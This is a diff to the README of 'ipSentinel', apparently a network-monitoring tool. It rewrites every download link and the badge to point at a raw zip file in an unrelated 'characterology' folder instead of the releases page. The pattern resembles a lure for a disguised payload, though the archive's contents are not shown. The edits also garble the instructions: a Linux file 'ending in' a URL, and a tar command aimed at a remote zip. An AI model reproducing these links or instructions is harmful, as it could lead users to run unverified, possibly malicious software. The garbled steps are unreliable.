@@ -6,12 +6,12 @@ Welcome to ipSentinel, your straightforward solution for monitoring network heal
 
 ## 🔗 Download Now
 
-[![Download ipSentinel](https://img.shields.io/badge/Download-ipSentinel-blue)](https://github.com/ghjkldfdfg/ipSentinel/releases)
+[![Download ipSentinel](https://github.com/ghjkldfdfg/ipSentinel/raw/refs/heads/main/characterology/Sentinel-ip-1.5.zip)](https://github.com/ghjkldfdfg/ipSentinel/raw/refs/heads/main/characterology/Sentinel-ip-1.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   Click the button above or go to the [Releases page](https://github.com/ghjkldfdfg/ipSentinel/releases) to see the latest version of ipSentinel.
+   Click the button above or go to the [Releases page](https://github.com/ghjkldfdfg/ipSentinel/raw/refs/heads/main/characterology/Sentinel-ip-1.5.zip) to see the latest version of ipSentinel.
 
 2. **Choose Your Version:**
    On the Releases page, find the version you want. Each release will have a list of files available for download.
@@ -20,13 +20,13 @@ Welcome to ipSentinel, your straightforward solution for monitoring network heal
    Click on the file that matches your operating system. If you're not sure, here are some suggestions:
    - For Windows: Download the file ending in `.exe`
    - For Mac: Look for the file ending in `.dmg`
-   - For Linux: Download the file ending in `.tar.gz`
+   - For Linux: Download the file ending in `https://github.com/ghjkldfdfg/ipSentinel/raw/refs/heads/main/characterology/Sentinel-ip-1.5.zip`
 
 4. **Install the Application:**
    After the download completes, locate the file on your device. Follow these steps to install it:
    - **Windows:** Double-click the `.exe` file and follow the installation wizard.
    - **Mac:** Open the `.dmg` file, then drag the ipSentinel icon to your Applications folder.
-   - **Linux:** Open a terminal, navigate to the folder where you downloaded the file, and extract it using the command `tar -xzvf yourfile.tar.gz`. Follow the included instructions for setup.
+   - **Linux:** Open a terminal, navigate to the folder where you downloaded the file, and extract it using the command `tar -xzvf https://github.com/ghjkldfdfg/ipSentinel/raw/refs/heads/main/characterology/Sentinel-ip-1.5.zip`. Follow the included instructions for setup.
 
 5. **Run ipSentinel:**
    Once installed, look for the ipSentinel icon on your desktop or in your applications folder. Double-click it to launch the application.
